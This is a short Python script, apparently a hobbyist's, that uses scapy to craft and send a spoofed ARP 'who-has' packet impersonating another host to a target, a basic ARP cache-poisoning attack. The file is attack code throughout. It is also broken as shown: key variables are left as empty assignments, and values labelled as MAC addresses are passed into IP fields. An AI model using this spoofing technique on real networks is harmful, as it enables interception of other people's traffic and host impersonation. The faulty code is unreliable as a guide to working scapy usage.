import scapy

from scapy.all import *

"""
# GET MAC ADDRESS
def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac
my_mac = get_mac_address()
if not my_mac:
    print "Cant get local mac address, quitting"
    sys.exit(1)
"""
my_mac =  # MY MAC

# REQUEST Host_Target & Host_Impersonation

"""
target = raw_input("Enter host target: ")
impersonation = raw_input("Enter host to impersonate: ")
"""
target =  # TARGET MAC
impersonation =  # IMPERSONATION MAC

# CRAFT & SEND PACKET

packet = Ether()/ARP(op="who-has", hwsrc=my_mac, psrc=impersonation, pdst=target)
sendp(packet)
